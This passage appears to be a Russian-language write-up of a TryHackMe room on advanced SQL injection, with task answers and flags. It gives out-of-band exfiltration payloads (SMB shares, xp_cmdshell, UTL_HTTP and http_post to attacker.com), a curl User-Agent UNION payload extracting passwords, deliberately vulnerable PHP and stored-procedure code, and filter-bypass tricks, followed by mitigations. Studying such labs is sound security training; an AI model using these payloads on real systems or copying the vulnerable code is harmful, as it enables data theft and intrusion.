межсетевым экраном или в другом сегменте сети.

Методы работы с различными базами данных

Атаки с использованием SQL- инъекций по внеполосному каналу используют методологию записи на другой канал связи с 
помощью специально созданного запроса. Эта техника эффективна для извлечения данных или выполнения вредоносных 
действий, когда прямое взаимодействие с базой данных ограничено. В базе данных есть несколько команд, которые могут 
позволить извлечение, но ниже приведен список наиболее часто используемых в различных системах баз данных:

MySQL и MariaDB

В MySQL или MariaDB внеполосная SQL-инъекция может быть достигнута с помощью  команды SELECT ... INTO OUTFILE или 
load_file . Эта команда позволяет злоумышленнику записать результаты запроса в файл в файловой системе сервера. 
Например:

`SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';`
Затем злоумышленник может получить доступ к этому файлу через общий ресурс SMB или HTTP- сервер, работающий на 
сервере базы данных, и таким образом вывести данные через альтернативный канал.

Microsoft SQL Server (MSSQL)

В MSSQL, Out-of-band SQL инъекция может быть выполнена с использованием таких функций, как xp_cmdshell , что 
позволяет выполнять команды оболочки непосредственно из SQL запросов. Это может быть использовано для записи данных 
в файл, доступный через сетевой ресурс:

`EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';`
В качестве альтернативы OPENROWSETили BULK INSERTможет использоваться для взаимодействия с внешними источниками 
данных, облегчая утечку данных через каналы OOB.

Оракул

В базах данных Oracle, Out-of-band SQL инъекция может быть выполнена с использованием пакетов UTL_HTTP или UTL_FILE .
Например, пакет UTL_HTTP может быть использован для отправки HTTP- запросов с конфиденциальными данными:
```commandline

DECLARE
  req UTL_HTTP.REQ;
  resp UTL_HTTP.RESP;
BEGIN
  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
  UTL_HTTP.GET_RESPONSE(req);
END;
```
Примеры внеполосных методов

Методы SQL-инъекции вне диапазона в MySQL и MariaDB могут использовать различные сетевые протоколы для извлечения 
данных. Основные методы включают DNS-извлечение, HTTP- запросы и SMB- общие ресурсы. Каждый из этих методов может 
применяться в зависимости от возможностей среды MySQL/MariaDB и настроек сети.

HTTP- запросы

Используя функции базы данных, которые разрешают HTTP- запросы, злоумышленники могут отправлять конфиденциальные 
данные напрямую на контролируемый ими веб-сервер. Этот метод использует функциональные возможности базы данных, 
которые могут создавать исходящие HTTP- подключения. Хотя MySQL и MariaDB изначально не поддерживают HTTP- запросы, 
это можно сделать с помощью внешних скриптов или пользовательских функций (UDF), если база данных настроена на 
разрешение таких операций.

Во-первых, необходимо создать и установить UDF для поддержки HTTP- запросов. Эта настройка сложна и обычно требует 
дополнительной конфигурации. Пример запроса будет выглядеть так SELECT http_post('http://attacker.com/exfiltrate', 
sensitive_data) FROM books;: .

Эксфильтрация HTTP-запросов может быть реализована в системах Windows и Linux (Ubuntu) в зависимости от поддержки 
базой данных внешних скриптов или UDF, которые разрешают HTTP- запросы.

DNS- эксфильтрация 

Злоумышленники могут использовать SQL-запросы для генерации DNS-запросов с закодированными данными, которые 
отправляются на вредоносный DNS-сервер, контролируемый злоумышленником. Этот метод обходит системы мониторинга на 
основе HTTP и использует способность базы данных выполнять DNS- поиск.

Как обсуждалось выше, MySQL изначально не поддерживает генерацию DNS- запросов только с помощью команд SQL; 
злоумышленники могут использовать другие средства, такие как пользовательские функции (UDF) или системные скрипты 
для выполнения DNS- поиска.

Эксфильтрация малого и среднего бизнеса

Эксфильтрация SMB подразумевает запись результатов запроса в общий ресурс SMB на внешнем сервере. Этот метод 
особенно эффективен в средах Windows, но может быть также настроен в системах Linux с правильной настройкой. Пример 
запроса будет выглядеть так SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';.

Это полностью поддерживается, поскольку Windows изначально поддерживает пути SMB/UNC. Linux (Ubuntu): Хотя прямые 
пути UNC более родные для Windows, общие ресурсы SMB можно монтировать и получать доступ к ним в Linux с помощью 
таких инструментов, как smbclientили путем монтирования общего ресурса в локальный каталог. Прямое использование 
путей UNC в запросах SQL может потребовать дополнительной настройки или скриптов для упрощения взаимодействия.

Практический пример

В этом практическом сценарии мы продемонстрируем, как злоумышленник может извлечь данные из уязвимого веб-приложения 
с помощью техники SQL-инъекции Out-of-band. Код на стороне сервера содержит уязвимость SQL-инъекции, которая 
позволяет злоумышленнику создать полезную нагрузку, которая записывает результаты запроса во внешний ресурс SMB . 
Это полезно, когда прямые ответы из базы данных ограничены или отслеживаются.

Объяснение сценария

В этом сценарии мы бы включили сетевой ресурс на AttackBox в ATTACKBOX_IP\logs. Этот ресурс доступен по сети и 
позволяет записывать на него файлы с других машин. Вы можете предположить сценарий, когда у вас есть уязвимая 
система и вы хотите перенести данные в другую сетевую систему. Злоумышленник воспользуется этим ресурсом для 
извлечения данных Out-of-band. Чтобы получить сетевой ресурс, мы бы запустили AttackBox и выполнили следующую 
команду в терминале:

Перейдите в impacketкаталог, используяcd /opt/impacket/examples
Введите команду  python3.9 smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmpдля запуска SMB- сервера, предоставляющего общий доступ к /tmpкаталогу.
Вы можете получить доступ к содержимому сетевого ресурса, введя команду  smbclient //ATTACKBOX_IP/logs -U guest -N. Это позволит вам подключиться к сетевому ресурсу, а затем вы можете выполнить команду lsдля вывода списка всех команд.
У нас есть то же самое веб-приложение с функцией поиска, которое опрашивает посетителей, посещающих библиотеку. Серверный код этой функции уязвим для SQL- инъекции, и вы можете получить к нему доступ по адресу  http://MACHINE_IP/oob/search_visitor.php?visitor_name=Tim. 

ответ на обычный запрос

Код сервера выглядит так:

```commandline
$visitor_name = $_GET['visitor_name'] ?? '';

$sql = "SELECT * FROM visitor WHERE name = '$visitor_name'";

echo "<p>Generated SQL Query: $sql</p>";

// Execute multi-query
if ($conn->multi_query($sql)) {
    do {
        // Store first result set
        if ($result = $conn->store_result()) {
            if ($result->num_rows > 0) {
                while ($row = $result->fetch_assoc()) {
```
Важное соображение

Важно отметить, что системная переменная MySQL secure_file_privможет быть установлена. При установке эта переменная содержит путь к каталогу, и MySQL разрешит запись файлов только в этот указанный каталог. Эта мера безопасности помогает снизить риск несанкционированных операций с файлами. 

Если secure_file_priv установлен : MySQL ограничит файловые операции, такие как INTO OUTFILE , указанным каталогом. Это означает, что злоумышленники могут записывать файлы только в этот каталог, ограничивая свои возможности по извлечению данных в произвольные места.
Если secure_file_priv пуста : Если secure_file_priv переменная пуста, MySQL не накладывает никаких ограничений на 
каталоги, позволяя записывать файлы в любой каталог, доступный процессу сервера MySQL. Такая конфигурация представляет более высокий риск, поскольку обеспечивает большую гибкость для злоумышленников.
У злоумышленников обычно нет прямого доступа для проверки значения переменной secure_file_priv. В результате им приходится полагаться на методы hit-and-trial, чтобы определить, могут ли они записывать файлы и где, проверяя различные пути, чтобы увидеть, успешны ли файловые операции.

Подготовка полезной нагрузки

Чтобы воспользоваться этой уязвимостью, злоумышленник создает полезную нагрузку для внедрения в visitor_name параметр.
Полезная нагрузка будет разработана для выполнения дополнительного SQL-запроса, который записывает информацию о 
версии базы данных на внешний ресурс SMB.

`1'; SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; --`
Давайте разберем приведенную выше полезную нагрузку:

1': Закрывает исходную строку в запросе SQL .
;: Завершает первый оператор SQL .
SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt';: Выполняет новый оператор SQL, который извлекает версию базы данных и записывает ее в общий ресурс SMB по адресу \\ ATTACKBOX_IP \logs\out.txt.
--: Комментирует оставшуюся часть исходного SQL- запроса для предотвращения синтаксических ошибок.
Чтобы использовать полезную нагрузку, злоумышленник должен перейти по URL-адресу, который создает файл на внешнем ресурсе SMB . 

Чтобы получить доступ к файлу, используйте , ls /tmpчтобы увидеть полученный файл в /tmp каталоге, как показано ниже: 


Терминал
thm@machine$ls /tmp
out.txt
### Ответьте на вопросы ниже
Что выводит @@version на сервере MySQL?
```commandline
10.4.24-MariaDB
```
Каково значение переменной @@basedir?
```commandline
C:/xampp/mysql
```

## Задание 7
Расширенная SQL- инъекция включает в себя ряд сложных методов, которые выходят за рамки базовых атак. Вот несколько 
важных расширенных методов, о которых должны знать пентестеры:

Внедрение HTTP- заголовка

Заголовки HTTP могут переносить пользовательский ввод, который может использоваться в SQL-запросах на стороне 
сервера. инъекция пользовательского агентаЕсли эти вводы не очищаются, это может привести к SQL-инъекции. Техника 
включает в себя манипулирование HTTP- заголовками (такими как User-Agent , Referer или X-Forwarded-For ) для 
внедрения SQL -команд. Сервер может регистрировать эти заголовки или использовать их в SQL- запросах. Например, 
вредоносный заголовок User-Agent будет выглядеть так  User-Agent: ' OR 1=1; --.  Если сервер включает заголовок 
User-Agent в SQL- запрос без его очистки, это может привести к SQL- инъекции.

В этом примере веб-приложение регистрирует заголовок User-Agent из HTTP- запросов в таблице с именем logs в базе 
данных. Приложение предоставляет конечную точку, на http://MACHINE_IP/httpagent/которой отображаются все 
зарегистрированные записи из таблицы logs. Когда пользователи посещают веб-страницу, их браузер отправляет заголовок 
User-Agent, который идентифицирует браузер и операционную систему. Этот заголовок обычно используется для 
регистрации или для адаптации контента для определенных браузеров. В нашем приложении этот заголовок User-Agent 
вставляется в таблицу logs и затем может быть просмотрен через предоставленную конечную точку.

Учитывая конечную точку, злоумышленник может попытаться внедрить код SQL в заголовок User-Agent, чтобы использовать 
уязвимости SQL -инъекции. Например, установив заголовок User-Agent на вредоносное значение, такое как User-Agent: ' 
UNION SELECT username, password FROM user; --, злоумышленник пытается внедрить код SQL , который объединяет 
результаты из таблицы журналов с конфиденциальными данными из таблицы пользователей.

Вот код на стороне сервера, который вставляет логи.
```commandline
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$insert_sql = "INSERT INTO logs (user_Agent) VALUES ('$userAgent')";
if ($conn->query($insert_sql) === TRUE) {
    echo "<p class='text-green-500'>New logs inserted successfully</p>";
} else {
    echo "<p class='text-red-500'>Error: " . $conn->error . " (Error Code: " . $conn->errno . ")</p>";
}

$sql = "SELECT * FROM logs WHERE user_Agent = '$userAgent'";
..
... 

```
Значение User-Agent вставляется в таблицу журналов с помощью оператора INSERT SQL . Если вставка прошла успешно, 
отображается сообщение об успехе. Если во время вставки произошла ошибка, отображается сообщение об ошибке с 
подробностями.

панель управления для просмотра журналов

Подготовка полезной нагрузки

Мы подготовим и внедрим полезную нагрузку SQL в заголовок User-Agent, чтобы продемонстрировать, как можно 
эксплуатировать SQL-инъекцию через заголовки HTTP. Наша целевая полезная нагрузка будет  ' UNION SELECT username, 
password FROM user; #.  Эта полезная нагрузка предназначена для:

Закройте существующий строковый литерал : начальная одинарная кавычка ( ') используется для закрытия существующего строкового литерала в запросе SQL .
Внедрение оператора UNION SELECT : UNION SELECT username, password FROM user;часть полезной нагрузки используется для извлечения столбцов имени пользователя и пароля из таблицы пользователей.
Закомментировать остальную часть запроса : этот #символ используется для комментирования оставшейся части SQL- запроса, гарантируя, что любой последующий код SQL будет проигнорирован.
Нам нужно отправить эту полезную нагрузку как часть заголовка User-Agent в нашем HTTP- запросе для внедрения этой полезной нагрузки, что можно сделать с помощью таких инструментов, как Burp Suite или cURL . Мы будем использовать инструмент командной строки curl для отправки HTTP-запроса с пользовательским заголовком User-Agent.  Откройте терминал и получите доступ к интерфейсу командной строки.  Используйте следующую команду для отправки запроса с пользовательским User-Agentзаголовком:

Пример терминала
```commandline
user@tryhackme$ curl -H "User-Agent: ' UNION SELECT username, password FROM user; # " http://MACHINE_IP/httpagent/
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection </title>
 rel="stylesheet">
</head>
<body class="bg-gray-100">
    <div class="container mx-auto p-8">
        <h1 class="text-4xl font-bold mb-8 text-center">HTTP Logs</h1>
        <div class="bg-white p-6 rounded-lg shadow-lg">

<p class='text-gray-600 text-sm mb-4'>Generated SQL Query: <span class='text-red-500'>SELECT * FROM logs WHERE user_Agent = '' UNION SELECT username, password FROM user; #'</span></p><div class='p-4 bg-gray-100 rounded shadow mb-4'><p class='font-bold'>id: <span class='text-gray-700'>bob</span></p><p class='font-bold'>user_Agent: <span class='text-gray-700'>bob@123</span></p></div><div class='p-4 bg-gray-100 rounded shadow mb-4'><p class='font-bold'>id: <span class='text-gray-700'>attacker</span></p><p class='font-bold'>user_Agent: <span class='text-gray-700'>tesla</span></p></div>
        </div>
    </div>
</body>
</html>
```
Ответ сервера будет отображен в терминале. Если SQL- инъекция прошла успешно, вы увидите извлеченные данные (имена пользователей и пароли) в ответе.

Использование хранимых процедур

Хранимые процедуры — это процедуры, хранящиеся в базе данных, которые могут выполнять различные операции, такие как вставка, обновление или запрос данных. Хотя хранимые процедуры могут помочь повысить производительность и обеспечить согласованность, они также могут быть уязвимы для SQL- инъекций, если с ними не обращаться должным образом.

поток процесса хранимой процедуры

Хранимые процедуры — это предварительно скомпилированные операторы SQL , которые могут быть выполнены как единое целое. Они хранятся в базе данных и могут вызываться приложениями для выполнения определенных задач. Хранимые процедуры могут принимать параметры, что делает их гибкими и мощными. Однако, если эти параметры не будут должным образом очищены, они могут привести к уязвимостям SQL -инъекций.

Рассмотрим хранимую процедуру, предназначенную для извлечения данных пользователя на основе его имени:
```commandline
CREATE PROCEDURE sp_getUserData
    @username NVARCHAR(50)
AS
BEGIN
    DECLARE @sql NVARCHAR(4000)
    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
    EXEC(@sql)
END
```

В этом примере хранимая процедура объединяет параметр @username в динамический SQL- запрос. Этот подход уязвим для SQL -инъекции, поскольку входные данные не очищаются.

XML и JSON- инъекции 

Приложения, которые анализируют данные XML или JSON и используют проанализированные данные в запросах SQL, могут быть уязвимы для инъекции, если они не очищают входные данные должным образом. Инъекция XML и JSON подразумевает внедрение вредоносных данных в структуры XML или JSON , которые затем используются в запросах SQL . Это может произойти, если приложение напрямую использует проанализированные значения в операторах SQL .
```commandline
{
  "username": "admin' OR '1'='1--",
  "password": "password"
}
```
Если приложение использует эти значения непосредственно в SQL- запросе, например SELECT * FROM users WHERE username = 'admin' OR '1'='1'-- AND password = 'password', это может привести к инъекции.

### Ответьте на вопросы ниже
Каково значение поля флага в таблице книг, где book_id = 1?
```commandline
THM{HELLO}
```
Какое поле обнаруживается на стороне сервера при извлечении пользовательского агента?
```commandline
User-Agent
```

## Задание 8
SQL -инъекция остается распространенной угрозой из-за неправильной реализации мер безопасности и сложности различных веб-фреймворков .  Автоматизация идентификации и эксплуатации этих уязвимостей может быть сложной задачей, но было разработано несколько инструментов и методов, помогающих оптимизировать этот процесс.автоматизация SQL-инъекции

Основные проблемы при идентификации

Выявление уязвимостей SQL Injection связано с несколькими проблемами, аналогичными выявлению любой другой уязвимости на стороне сервера. Вот основные проблемы:

Динамическая природа SQL- запросов : SQL- запросы могут быть динамически сконструированы, что затрудняет обнаружение точек инъекции. Сложные запросы с несколькими уровнями логики могут скрывать потенциальные уязвимости.
Разнообразие точек инъекции : SQL-инъекция может происходить в разных частях приложения, включая поля ввода, заголовки HTTP и параметры URL. Выявление всех потенциальных точек инъекции требует тщательного тестирования и всестороннего понимания приложения.
Использование мер безопасности : приложения могут использовать подготовленные операторы, параметризованные запросы и фреймворки ORM, которые могут предотвратить SQL- инъекцию. Автоматизированные инструменты должны иметь возможность различать безопасные и небезопасные конструкции запросов.
Контекстно-специфическое обнаружение : контекст, в котором пользовательские данные используются в запросах SQL, может сильно различаться. Инструменты должны адаптироваться к различным контекстам, чтобы точно определять уязвимости.
Несколько важных инструментов

В сообществе безопасности было разработано несколько известных инструментов и проектов, помогающих автоматизировать поиск уязвимостей SQL -инъекций. Вот несколько известных инструментов и репозиториев GitHub, которые предоставляют функциональные возможности для обнаружения и эксплуатации SQL -инъекций:

SQLMap : SQLMap — это инструмент с открытым исходным кодом, который автоматизирует процесс обнаружения и эксплуатации уязвимостей SQL Injection в веб-приложениях. Он поддерживает широкий спектр баз данных и предоставляет обширные возможности как для идентификации, так и для эксплуатации. Подробнее об этом инструменте можно узнатьздесь.
SQLNinja : SQLNinja — это инструмент, специально разработанный для эксплуатации уязвимостей SQL Injection в веб-приложениях, использующих Microsoft SQL Server в качестве внутренней базы данных. Он автоматизирует различные этапы эксплуатации, включая снятие отпечатков с базы данных и извлечение данных. 
JSQL Injection : библиотека Java, ориентированная на обнаружение уязвимостей SQL -инъекций в приложениях Java . Она поддерживает различные типы атак SQL -инъекций и предоставляет ряд возможностей для извлечения данных и получения контроля над базой данных.
BBQSQL : BBQSQL — это фреймворк для эксплуатации слепыхSQL-инъекций, разработанный с целью простоты и высокой эффективности автоматизированной эксплуатации уязвимостей слепыхSQL-инъекций. 
Автоматизация выявления и эксплуатации уязвимостей SQL -инъекций имеет решающее значение для поддержания безопасности веб-приложений . Такие инструменты, как SQLMap, SQLNinja и BBQSQL, предоставляют мощные возможности для обнаружения и эксплуатации этих уязвимостей. Однако важно понимать ограничения автоматизированных инструментов и необходимость ручного анализа и проверки для обеспечения всестороннего охвата безопасности. Интегрируя эти инструменты в свой рабочий процесс безопасности и следуя передовым методам проверки входных данных и построения запросов, вы можете эффективно снизить риски, связанные с уязвимостями SQL- инъекций.

### Ответьте на вопросы ниже
Помогает ли динамическая природа SQL-запросов пентестеру идентифицировать SQL-инъекции (да/нет)?

```commandline
nay
```

## Задание 9
SQL-инъекция — известная и распространенная уязвимость, которая уже много лет вызывает серьезную озабоченность в сфере безопасности веб-приложений. Пентестеры должны уделять особое внимание этой уязвимости во время своих оценок, поскольку она требует глубокого понимания различных методов для выявления и эксплуатации точек SQL-инъекции. Аналогичным образом, разработчики защищенного кода должны уделять первостепенное внимание защите своих приложений, внедряя надежную проверку входных данных и придерживаясь безопасных методов кодирования для предотвращения таких атак. Ниже приведены некоторые из лучших методов: лучшие практики для безопасных кодеров

Безопасные кодеры

Параметризованные запросы и подготовленные операторы : используйте параметризованные запросы и подготовленные операторы, чтобы гарантировать, что все пользовательские вводы обрабатываются как данные, а не как исполняемый код. Этот метод помогает предотвратить SQL-инъекцию, отделяя структуру запроса от данных. Например, в PHP с PDO вы можете подготовить оператор и связать параметры, что гарантирует безопасную обработку пользовательских вводов, как $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username"); $stmt->execute(['username' => $username]);.
Проверка и очистка входных данных : реализуйте строгую проверку и очистку входных данных, чтобы гарантировать соответствие входных данных ожидаемым форматам. Проверяйте типы данных, длины и диапазоны и отклоняйте любые входные данные, которые не соответствуют этим критериям. Используйте встроенные функции, такие как htmlspecialchars()и filter_var()в PHP, для эффективной очистки входных данных.
Принцип наименьших привилегий : применяйте принцип наименьших привилегий, предоставляя учетным записям приложений минимально необходимые разрешения базы данных. Избегайте использования учетных записей базы данных с административными привилегиями для повседневных операций. Это минимизирует потенциальное воздействие успешной атаки SQL-инъекции, ограничивая доступ злоумышленника к критическим функциям базы данных.
Хранимые процедуры : инкапсулируйте и проверяйте логику SQL с помощью хранимых процедур. Это позволяет контролировать и проверять входные данные в самой базе данных, снижая риск внедрения SQL . Убедитесь, что хранимые процедуры принимают только проверенные входные данные и разработаны для внутренней обработки очистки входных данных.
Регулярные аудиты безопасности и обзоры кода : проводите регулярные аудиты безопасности и обзоры кода для выявления и устранения уязвимостей. Автоматизированные инструменты могут помочь в сканировании на предмет рисков SQL- инъекций, но ручные обзоры также необходимы для обнаружения тонких проблем. Регулярные аудиты гарантируют, что ваши методы безопасности будут актуальными с учетом развивающихся угроз.

Пентестеры

Эксплуатация функций, специфичных для баз данных : Различные системы управления базами данных (СУБД) имеют уникальные функции и синтаксис. Пентестер должен понимать специфику целевой СУБД (например, MySQL, PostgreSQL, Oracle, MSSQL), чтобы эффективно эксплуатировать эти функции. Например, MSSQL поддерживает команду xp_cmdshell, которую можно использовать для выполнения системных команд.
Использование сообщений об ошибках : используйте подробные сообщения об ошибках, чтобы получить представление о схеме и структуре базы данных. SQL-инъекция на основе ошибок подразумевает провоцирование приложения на генерацию сообщений об ошибках, которые раскрывают полезную информацию. Например, использование 1' AND 1=CONVERT(int, (SELECT @@version)) может генерировать ошибки, которые приводят к утечке информации о версии.
Обход WAF и фильтров : протестируйте различные методы обфускации для обхода брандмауэров веб-приложений (WAF) и входных фильтров. Сюда входит использование смешанного регистра (SeLeCt), конкатенации (CONCAT(CHAR(83), CHAR(69), CHAR(76), CHAR(69), CHAR(67), CHAR(84))) и альтернативных кодировок (шестнадцатеричная, URL-кодировка). Кроме того, использование встроенных комментариев (/**/) и различных кодировок символов (например, %09, %0A) может помочь обойти простые фильтры.
Отпечатки баз данных : определение типа и версии базы данных для адаптации атаки. Это можно сделать, отправив определенные запросы, которые дают разные результаты в зависимости от СУБД. Например, SELECT version() работает на PostgreSQL, тогда как SELECT @@version работает на MySQL и MSSQL.
Поворот с SQL- инъекцией : используйте SQL- инъекцию для поворота и эксплуатации других частей сети. После того, как сервер базы данных скомпрометирован, его можно использовать для получения доступа к другим внутренним системам. Это может включать извлечение учетных данных или эксплуатацию доверительных отношений между системами.
Расширенное тестирование SQL-инъекций требует глубокого понимания различных методов и способности адаптироваться к различным средам. Пентестеры должны использовать различные методы, от эксплуатации специфических для базы данных функций до обхода сложных фильтров и тщательной оценки и эксплуатации уязвимостей SQL-инъекций. Методичное документирование каждого шага обеспечивает комплексную оценку безопасности приложения.

### Ответьте на вопросы ниже
Какую команду поддерживает MSSQL для выполнения системных команд?

```commandline
xp_cmdshell
```

## Задание 10
В этой комнате мы рассмотрели несколько передовых методов SQL -инъекции, включая Second-Order SQL Injection, Out-of-Band SQLi и обход фильтра. Мы также рассмотрели такие методы, как внедрение cookie-файлов, иллюстрирующие разнообразные методы, которые злоумышленники используют для эксплуатации веб-приложений. Наше путешествие не остановилось на эксплуатации; мы обсудили важность автоматизации в выявлении и эксплуатации уязвимостей SQL -инъекции и использования инструментов для оптимизации и улучшения наших процессов тестирования.

Понимание этих передовых методов имеет решающее значение для любого тестировщика на проникновение, который стремится обнаружить и устранить сложные уязвимости безопасности. Кроме того, мы обсудили различные меры по смягчению последствий для защиты приложений от этих сложных атак, подчеркивая необходимость надежной позиции безопасности.

Как тестировщик на проникновение, ваша роль заключается не только в поиске уязвимостей, но и в понимании лучших практик по исправлению и профилактике. Вооружившись знаниями из этой комнаты, вы будете лучше подготовлены к защите веб-приложений, гарантируя их устойчивость к меняющемуся ландшафту угроз SQL -инъекций.

Поделитесь своими мыслями об этой комнате на нашем канале Discord или в аккаунте X. Увидимся.

### Ответьте на вопросы ниже
Я успешно завершил комнату.
```commandline
Ответ не нужен
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)